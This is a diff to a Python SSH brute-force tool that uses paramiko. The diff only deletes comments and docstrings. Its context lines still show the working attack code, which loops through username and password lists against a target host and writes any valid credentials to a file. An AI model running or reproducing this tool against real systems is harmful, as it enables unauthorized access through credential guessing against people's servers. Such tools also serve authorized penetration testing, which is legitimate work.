@@ -6,21 +6,17 @@ import argparse
 from colorama import init, Fore
 import sys
 
-# Initialize colorama for colored output
 init()
 
-# Colors for feedback
 GREEN = Fore.GREEN
 RED = Fore.RED
 RESET = Fore.RESET
 BLUE = Fore.BLUE
 
 def is_ssh_open(hostname, username, password, port):
-    """Try to connect to the SSH server using the given credentials."""
     client = paramiko.SSHClient()
     client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
     try:
-        # Attempt to connect to the SSH server
         client.connect(hostname=hostname, username=username, password=password, port=port, timeout=3)
     except socket.gaierror:
         print(f"{RED}[!] Invalid hostname or IP address: {hostname}{RESET}")
@@ -43,7 +39,6 @@ def is_ssh_open(hostname, username, password, port):
 
 
 def brute_force_ssh(host, port, usernames, passwords, output_file=None):
-    """Brute force SSH login attempts with given usernames and passwords."""
     try:
         for username in usernames:
             for password in passwords:
@@ -51,12 +46,12 @@ def brute_force_ssh(host, port, usernames, passwords, output_file=None):
                 result = is_ssh_open(host, username, password, port)
                 if result == "invalid_host":
                     print(f"{RED}[!] Stopping brute force due to invalid hostname or IP.{RESET}")
-                    sys.exit(1)  # Exit the script immediately
-                elif result:  # Valid credentials found
+                    sys.exit(1)
+                elif result: 
                     if output_file:
                         with open(output_file, "a") as creds_file:
                             creds_file.write(f"HOSTNAME: {host}\tUSERNAME: {username}\tPASSWORD: {password}\n")
-                    return  # Exit the function after finding valid credentials
+                    return 
     except KeyboardInterrupt:
         print(f"{RED}\n[!] Process interrupted by user. Exiting...{RESET}")
         sys.exit(0)
@@ -73,7 +68,6 @@ def ssh_bruteforce_main(args=None):
     parser.add_argument("-P", "--passlist", help="File of passwords, each on a new line")
     parser.add_argument("-o", "--output", help="Output file for successful credentials")
 
-    # Parse arguments from the provided list
     args = parser.parse_args(args)
     host, port = args.host, args.port
     output_file = args.output
